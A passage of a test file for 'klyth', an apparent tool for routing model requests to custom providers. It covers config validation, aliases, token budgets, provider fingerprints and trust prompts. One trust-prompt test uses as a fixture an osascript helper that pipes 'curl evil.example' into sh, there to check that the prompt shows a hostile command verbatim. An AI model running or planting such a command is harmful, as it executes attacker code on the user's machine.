  expect(parseConfig(JSON.stringify(withProvider({ timeoutMs: 1_800_000 }))).config?.providers['acme']?.timeoutMs).toBe(1_800_000)
  expect(config().providers['acme']?.timeoutMs).toBeUndefined()
})

test('sessionHeader is a header name on a provider of any kind, secret-looking names included; anything else is an error, and a model takes no such key', () => {
  for (const kind of ['openai', 'openai-responses', 'anthropic', 'bedrock']) expect(errorsOf(ofKind(kind, { sessionHeader: 'session_id' })), kind).toEqual([])
  for (const name of ['session_id', 'Session-Id', 'x-conversation']) expect(errorsOf(withProvider({ sessionHeader: name })), name).toEqual([])
  for (const bad of ['X Tag', 'x-tag:', 'x-tág', '', 7, null, ['session_id']]) expect(errorsOf(withProvider({ sessionHeader: bad })), JSON.stringify(bad)).toEqual(['providers.acme.sessionHeader: not a header name'])
  for (const own of ['Authorization', 'x-api-key', 'content-type', 'User-Agent']) expect(errorsOf(withProvider({ sessionHeader: own })), own).toEqual([`providers.acme.sessionHeader: ${own} is a header klyth sets itself`])
  expect(errorsOf(withModel({ sessionHeader: 'session_id' }))).toEqual(['providers.acme.models.model-a.sessionHeader: unknown key'])
  expect(parseConfig(JSON.stringify(withProvider({ sessionHeader: 'session_id' }))).config?.providers['acme']?.sessionHeader).toBe('session_id')
  expect(config().providers['acme']).not.toHaveProperty('sessionHeader')
})

const ALIAS_NAME = (name: string) => `aliases.${name}: alias names start with a lowercase letter and hold lowercase letters, digits, dashes and dots (no "..", at most 64 characters)`

test('alias names may carry dots, but never a slash, a leading dot, "..", a capital or more than 64 characters', () => {
  const alias = (name: string) => errorsOf(base({ aliases: { [name]: 'acme/model-a' } }))
  for (const name of ['model.v1-mini', 'gpt-4.1', 'v1.2.3', 'a.b', 'x', 'a'.repeat(64)]) expect(alias(name), name).toEqual([])
  for (const name of ['.model', 'model..v1', 'a/b', 'acme/model-a', 'Model.v1', '8model', '-model', 'a b', 'a_b', 'a'.repeat(65), '']) expect(alias(name), JSON.stringify(name)).toEqual([ALIAS_NAME(name)])
  expect(alias('opus')).toEqual(['aliases.opus: "opus" is a built-in model name'])
  const provider = base().providers.acme
  expect(errorsOf(base({ providers: { 'a.b': provider }, aliases: {} }))).toEqual(['providers.a.b: provider ids are lowercase letters, digits and dashes (not "native")'])
})

test('a dotted alias resolves, is klyth-shaped, is kept by a broken config, and is advertised, offered and typed ahead', () => {
  const c = parseConfig(JSON.stringify(base({ aliases: { 'model.v1-mini': { target: 'acme/model-a', note: 'dotted' }, fast: 'acme/model-b' } }))).config as Config
  expect(resolve(c, 'model.v1-mini')).toMatchObject({ kind: 'remote', target: 'acme/model-a', label: 'model.v1-mini' })
  expect(isKlythShaped(c, 'model.v1-mini')).toBe(true)
  expect(isKlythShaped(c, 'model.v1-other')).toBe(false)
  expect(isKlythShaped(undefined, 'model.v1-mini', ['model.v1-mini'])).toBe(true)
  expect(isKlythShaped(undefined, 'model.v1-mini')).toBe(false)
  expect(declaredAliases(JSON.stringify({ providers: 5, aliases: { 'model.v1-mini': 'x/y', 'bad..name': 'x/y', '.bad': 'x/y' } }))).toEqual(['model.v1-mini'])
  expect(modelNames(c)).toContain('model.v1-mini')
  expect(advert(c)).toContain('- model.v1-mini: acme/model-a — dotted')
  expect((agentSchema(c, SCHEMAS['Agent'] ?? {}) as { properties: { model: { enum: string[] } } }).properties.model.enum).toContain('model.v1-mini')
  expect(typeahead(c, '/model model.v1', 7, 'model.v1')).toEqual([{ text: 'model.v1-mini', description: 'dotted (acme/model-a)' }])
})

test('an alias note must be one line of at most 120 characters', () => {
  expect(errorsOf(base({ aliases: { fast: { target: 'acme/model-a', note: 'a\nb' } } }))).toEqual(['aliases.fast.note: must be one line of at most 120 characters'])
  expect(errorsOf(base({ aliases: { fast: { target: 'acme/model-a', note: 'x'.repeat(121) } } }))).toHaveLength(1)
})

test('the input budget is the input cap, else the window less a sent max-tokens, and is validated', () => {
  expect(inputBudget({ contextWindow: 1_050_000, maxInputTokens: 922_000, maxOutputTokens: 128_000, maxTokensParam: 'max_completion_tokens' }, 'openai')).toBe(922_000)
  expect(inputBudget({ contextWindow: 131_072, maxOutputTokens: 16_384, maxTokensParam: 'max_tokens' }, 'openai')).toBe(114_688)
  expect(inputBudget({ contextWindow: 8192, maxOutputTokens: 2048 }, 'openai')).toBe(8192)
  expect(inputBudget({ contextWindow: 400_000, maxInputTokens: 272_000, maxOutputTokens: 128_000 }, 'openai')).toBe(272_000)
  expect(inputBudget({ contextWindow: 400_000, maxOutputTokens: 128_000 }, 'openai-responses')).toBe(400_000)
  expect(inputBudget({ contextWindow: 400_000, maxOutputTokens: 128_000, maxTokensParam: 'max_output_tokens' }, 'openai-responses')).toBe(272_000)
  expect(errorsOf(withModel({ maxInputTokens: 2_000_000 }))).toEqual(['providers.acme.models.model-a.maxInputTokens: must be a positive integer no larger than contextWindow'])
  expect(errorsOf(withModel({ maxInputTokens: 1.5 }))).toHaveLength(1)
  expect(errorsOf(withModel({ maxInputTokens: undefined, contextWindow: 1000, maxOutputTokens: 1000 }))).toEqual([
    'providers.acme.models.model-a: maxOutputTokens leaves no input budget inside contextWindow',
  ])
})

test('names resolve: native models, native/<id>, both alias forms, provider/model split at the first slash', () => {
  const c = parseConfig(JSON.stringify(withProvider({ models: { ...base().providers.acme.models, 'gemini/gemini-2.5-pro': MODEL } }))).config as Config
  expect(resolve(c, 'haiku')).toEqual({ kind: 'native', model: 'haiku', label: 'haiku' })
  expect(resolve(c, 'native/haiku')).toEqual({ kind: 'native', model: 'haiku', label: 'haiku' })
  expect(resolve(c, 'native/claude-opus-4-1')).toEqual({ kind: 'native', model: 'claude-opus-4-1', label: 'claude-opus-4-1' })
  expect(resolve(c, 'fast')).toMatchObject({ kind: 'remote', target: 'acme/model-a', label: 'fast' })
  expect(resolve(c, 'strong')).toMatchObject({ kind: 'remote', target: 'acme/model-b', label: 'strong' })
  expect(resolve(c, 'acme/model-b')).toMatchObject({ kind: 'remote', target: 'acme/model-b', label: 'acme/model-b' })
  expect(resolve(c, 'acme/gemini/gemini-2.5-pro')).toMatchObject({ kind: 'remote', provider: { id: 'acme' }, model: { id: 'gemini/gemini-2.5-pro' } })
  expect(resolve(c, 'acme/gpt-6')).toBeUndefined()
  expect(explain(c, 'acme/gpt-6')).toBe('klyth: "gpt-6" is not declared under provider acme (declared: model-a, model-b, gemini/gemini-2.5-pro)')
  const toNative = parseConfig(JSON.stringify(base({ aliases: { quick: 'native/claude-haiku-4-5' } }))).config as Config
  expect(resolve(toNative, 'quick')).toEqual({ kind: 'native', model: 'claude-haiku-4-5', label: 'quick' })
})

test('prototype names resolve to nothing and are not klyth-shaped', () => {
  const c = config()
  for (const name of ['constructor', 'toString', '__proto__', 'acme/toString', 'acme/constructor', 'toString/x', 'hasOwnProperty/x']) {
    expect(resolve(c, name), name).toBeUndefined()
    expect(isKlythShaped(c, name), name).toBe(name.startsWith('acme/'))
  }
  expect(explain(c, 'acme/toString')).toBe('klyth: "toString" is not declared under provider acme (declared: model-a, model-b)')
  expect(explain(c, 'toString/x')).toBe('klyth: provider "toString" is not declared (declared: acme)')
  expect(errorsOf(base({ aliases: { strong: 'acme/constructor' } }))).toEqual(['aliases.strong → "constructor" is not declared under provider acme (declared: model-a, model-b)'])
})

test('/model arguments that are klyth-shaped, with a config and in the broken-config state', () => {
  const c = config()
  expect(['strong', 'fast', 'acme/model-b', 'acme/gpt-6', 'native/opus'].map(a => isKlythShaped(c, a))).toEqual([true, true, true, true, true])
  expect(['opus', 'sonnet', 'claude-opus-4-1', 'other/x'].map(a => isKlythShaped(c, a))).toEqual([false, false, false, false])
  expect(['strong', 'acme/model-b', 'native/opus', 'other/x'].map(a => isKlythShaped(undefined, a, ['strong']))).toEqual([true, true, true, true])
  expect(['opus', 'haiku', 'opusplan', 'claude-sonnet-4-5', 'default', 'fast'].map(a => isKlythShaped(undefined, a, ['strong']))).toEqual([false, false, false, false, false, false])
})

test('a broken config text still names its declared aliases, less built-in names; unparseable text names none', () => {
  expect(declaredAliases(JSON.stringify({ providers: 5, aliases: { strong: 'x/y', opus: 'x/y', 'Bad Name': 'x/y' } }))).toEqual(['strong'])
  expect(declaredAliases(JSON.stringify({ aliases: ['strong'] }))).toEqual([])
  expect(declaredAliases('{ not json')).toEqual([])
})

test('anthropic and bedrock always send max tokens, so their budget leaves room for the output without maxTokensParam', () => {
  const m = { contextWindow: 200_000, maxOutputTokens: 64_000 }
  expect([inputBudget(m, 'openai'), inputBudget(m, 'anthropic'), inputBudget(m, 'bedrock')]).toEqual([200_000, 136_000, 136_000])
  expect(inputBudget({ ...m, maxInputTokens: 100_000 }, 'anthropic')).toBe(100_000)
  expect(errorsOf(ofKind('openai', {}, { contextWindow: 64_000 }))).toEqual([])
  expect(errorsOf(ofKind('anthropic', {}, { contextWindow: 64_000 }))).toEqual(['providers.acme.models.model-a: maxOutputTokens leaves no input budget inside contextWindow'])
})

test('the fingerprint is kind, origin and the helper argv (or none), so a changed argv, origin, kind or a switch between helper and none is a new provider to approve', () => {
  const ACME = `openai|https://klyth.invalid|cmd:${JSON.stringify(HELPER)}`
  expect(fingerprint(config().providers['acme']!)).toBe(ACME)
  const openai = parseConfig(EXAMPLE_CONFIG).config?.providers['openai']!
  expect(fingerprint(openai)).toBe('openai|https://api.openai.com|cmd:["/usr/bin/security","find-generic-password","-s","klyth","-a","openai","-w"]')
  expect(Object.keys(LOCAL_TRUSTED)).toEqual([`trust:${fingerprint(parseConfig(LOCAL_CONFIG).config?.providers['local']!)}`])
  const of = (c: unknown) => fingerprint(parseConfig(JSON.stringify(c)).config?.providers['acme']!)
  expect(of(withAuth({ command: HELPER, ttlSeconds: 60 }))).toBe(ACME)
  expect(of(withAuth({ command: [...HELPER.slice(0, -2), 'other', '-w'] }))).not.toBe(ACME)
  expect(of(withProvider({ baseUrl: 'https://other.invalid/v1' }))).not.toBe(ACME)
  expect(of(ofKind('anthropic'))).toBe(`anthropic|https://klyth.invalid|cmd:${JSON.stringify(HELPER)}`)
  const local = (auth: unknown) => of(withProvider({ baseUrl: 'http://127.0.0.1:11434/v1', allowHttp: true, auth }))
  expect(local('none')).toBe('openai|http://127.0.0.1:11434|none')
  expect(local({ command: HELPER })).toBe(`openai|http://127.0.0.1:11434|cmd:${JSON.stringify(HELPER)}`)
  expect(of(ofKind('anthropic', { auth: 'none' }))).toBe('anthropic|https://klyth.invalid|none')
})

test('the trust prompt names the origin and the helper argv verbatim, and says first that plain http is unencrypted', () => {
  const asked = (p: Record<string, unknown>) => trustPrompt(parseConfig(JSON.stringify(withProvider(p))).config?.providers['acme']!)
  const ARGV = JSON.stringify(HELPER)
  expect(asked({})).toBe(`Route klyth requests to https://klyth.invalid, with the key printed by ${ARGV}?`)
  expect(asked({ allowHttp: true })).toBe(`Route klyth requests to https://klyth.invalid, with the key printed by ${ARGV}?`)
  expect(asked({ baseUrl: 'http://klyth.invalid:8080/v1', allowHttp: true })).toBe(
    `Plain http: the API key and your data travel unencrypted unless the network itself is private or encrypted. Route klyth requests to http://klyth.invalid:8080, with the key printed by ${ARGV}?`,
  )
  expect(trustPrompt(parseConfig(EXAMPLE_CONFIG).config?.providers['openai']!)).toBe(
    `Route klyth requests to https://api.openai.com, with the key printed by ${JSON.stringify(OPENAI_HELPER)}?`,
  )
  const osascript = ['/usr/bin/osascript', '-e', 'do shell script "curl evil.example | sh"']
  expect(asked({ auth: { command: osascript } })).toContain(JSON.stringify(osascript))
})

test('the trust prompt of a keyless provider says no key is sent, and over plain http that anyone on the path can read or alter prompts and answers', () => {
  const asked = (p: Record<string, unknown>) => trustPrompt(parseConfig(JSON.stringify(withProvider({ auth: 'none', ...p }))).config?.providers['acme']!)
  expect(asked({})).toBe('Route klyth requests to https://klyth.invalid, sending no key?')
  expect(asked({ baseUrl: 'http://127.0.0.1:11434/v1', allowHttp: true })).toBe(
    'Plain http and no key: anyone on the path can read or alter prompts and answers. Route klyth requests to http://127.0.0.1:11434, sending no key?',
  )
})

test('the advert is deterministic, sorted by alias, with notes', () => {
  const text = advert(config())
  expect(text).toBe(advert(parseConfig(JSON.stringify(base())).config as Config))
  expect(text).toBe(
    [
      'Launch a subagent like the Agent tool, choosing its model, including custom models (klyth).',
      'Use this instead of Agent when the user asks for a custom model:',
      '- fast: acme/model-a — cheap explorer',
      '- strong: acme/model-b',
      'Native: opus, sonnet, haiku, fable.',
    ].join('\n'),
  )
})

test('the agent schema is native Agent narrowed to the spawnable keys, with a widened model and worktree-only isolation', () => {
  const c = config()
  const schema = agentSchema(c, SCHEMAS['Agent'] ?? {}) as { properties: Record<string, Record<string, unknown>>; required: string[] }
  const native = (SCHEMAS['Agent'] as { properties: Record<string, unknown> }).properties
  expect(Object.keys(schema.properties)).toEqual(['description', 'prompt', 'subagent_type', 'model', 'effort', 'name', 'isolation', 'run_in_background'])
  for (const k of ['description', 'prompt', 'subagent_type', 'effort', 'name']) expect(schema.properties[k]).toEqual(native[k])
  expect(schema.properties['model']).toEqual({
    type: 'string',
    enum: ['acme/model-a', 'acme/model-b', 'fable', 'fast', 'haiku', 'opus', 'sonnet', 'strong'],
    description: "The model: a native alias or a klyth alias from this tool's description. Required, except for subagent_type fork, which runs on the model of the agent that calls it (name that one or none).",
  })
  expect(schema.properties['isolation']).toMatchObject({ type: 'string', enum: ['worktree'] })
  expect(schema.properties['run_in_background']).toEqual({
    type: 'boolean',
    description: 'From the main conversation a subagent runs in the background by default, and you are notified when it completes; from a subagent the call waits for the result. false waits for the result.',
  })
  expect(schema.required).toEqual(['description', 'prompt'])
  for (const name of modelNames(c)) expect(resolve(c, name), name).toBeDefined()
})

test('display shortens the home directory to ~ and handles empty, equal, sibling and trailing-slash paths', () => {
  expect(display('/home/u/.claude', '/home/u', 'klyth.json')).toBe('~/.claude/klyth.json')
  expect(display('/cfg', '', 'klyth.json')).toBe('/cfg/klyth.json')
  expect(display('/home/u', '/home/u', 'klyth.json')).toBe('~/klyth.json')
  expect(display('/home/u2/.claude', '/home/u', 'klyth.json')).toBe('/home/u2/.claude/klyth.json')
  expect(display('/home/u/.claude', '/home/u/', 'klyth.json')).toBe('~/.claude/klyth.json')
  expect(display('/home/u/work/', '/home/u', 'klyth.json')).toBe('~/work/klyth.json')
  expect(display('/cfg/', '/home/u', 'klyth.json')).toBe('/cfg/klyth.json')
})

test('context-tier pricing parses complete schedules on canonical models and survives alias resolution', () => {
  const pricing = { currency: 'USD', perMillionTokens: { input: 1, output: 4 }, tiers: [{ aboveInputTokens: 272000, perMillionTokens: { input: 2, output: 8, cacheWrite: { '5m': 0, '1h': 0.5 } } }] }
  const parsed = parseConfig(JSON.stringify(withModel({ pricing })))
  expect(parsed.errors).toEqual([])
  expect(parsed.config?.providers['acme']?.models['model-a']?.pricing).toEqual(pricing)
  expect(resolve(parsed.config!, 'fast')).toMatchObject({ kind: 'remote', target: 'acme/model-a', model: { pricing } })
  expect(errorsOf(withModel({ pricing: { ...pricing, tiers: [] } }))).toEqual([])
  expect(errorsOf(withModel({ pricing: { ...pricing, tiers: [{ aboveInputTokens: 0, perMillionTokens: {} }] } }))).toEqual([])
  expect(errorsOf(withModel({ pricing: { ...pricing, tiers: [{ aboveInputTokens: 272000 }] } }))).toEqual(['providers.acme.models.model-a.pricing.tiers[0].perMillionTokens: must be an object'])
  expect(errorsOf({ ...base(), aliases: { paid: { target: 'acme/model-a', pricing } } })).toEqual(['aliases.paid.pricing: unknown key'])
})

test('model pricing accepts partial USD rates and cache-write variants, but rejects invalid or alias pricing', () => {
  const withPricing = (pricing: unknown) => withModel({ pricing })
  const accepted = [
    { currency: 'USD', perMillionTokens: {} },
    { currency: 'USD', perMillionTokens: { input: 1, output: 0.25, cacheRead: 0, cacheWrite: 1.5 } },
    { currency: 'USD', perMillionTokens: { cacheWrite: { '5m': 0.1, '1h': 0.2 } } },
  ]
  for (const pricing of accepted) expect(errorsOf(withPricing(pricing)), JSON.stringify(pricing)).toEqual([])
  expect((parseConfig(JSON.stringify(withPricing(accepted[1]))).config as Config).providers['acme']?.models['model-a']?.pricing).toEqual(accepted[1])
  const path = 'providers.acme.models.model-a.pricing'
  const rejected: [unknown, string][] = [
    [null, `${path}: must be an object`],
    [{ perMillionTokens: {} }, `${path}.currency: must be "USD"`],
    [{ currency: 'EUR', perMillionTokens: {} }, `${path}.currency: must be "USD"`],
    [{ currency: 'USD' }, `${path}.perMillionTokens: must be an object`],
    [{ currency: 'USD', perMillionTokens: { input: -1 } }, `${path}.perMillionTokens.input: must be a finite nonnegative number`],
    [{ currency: 'USD', perMillionTokens: { output: null } }, `${path}.perMillionTokens.output: must be a finite nonnegative number`],
    [{ currency: 'USD', perMillionTokens: { cacheRead: Infinity } }, `${path}.perMillionTokens.cacheRead: must be a finite nonnegative number`],
    [{ currency: 'USD', perMillionTokens: { cacheWrite: { '5m': 1, '30m': 2 } } }, `${path}.perMillionTokens.cacheWrite.30m: unknown key`],
    [{ currency: 'USD', perMillionTokens: { other: 1 } }, `${path}.perMillionTokens.other: unknown key`],
  ]
  for (const [pricing, error] of rejected) expect(errorsOf(withPricing(pricing)), JSON.stringify(pricing)).toEqual([error])
  const nonFinite = JSON.stringify(withPricing({ currency: 'USD', perMillionTokens: { input: 1 } })).replace('"input":1', '"input":1e400')
  expect(parseConfig(nonFinite).errors).toEqual([`${path}.perMillionTokens.input: must be a finite nonnegative number`])
  expect(errorsOf({ ...ofKind('openai'), aliases: { paid: { target: 'acme/model-a', pricing: accepted[0] } } })).toEqual(['aliases.paid.pricing: unknown key'])
})
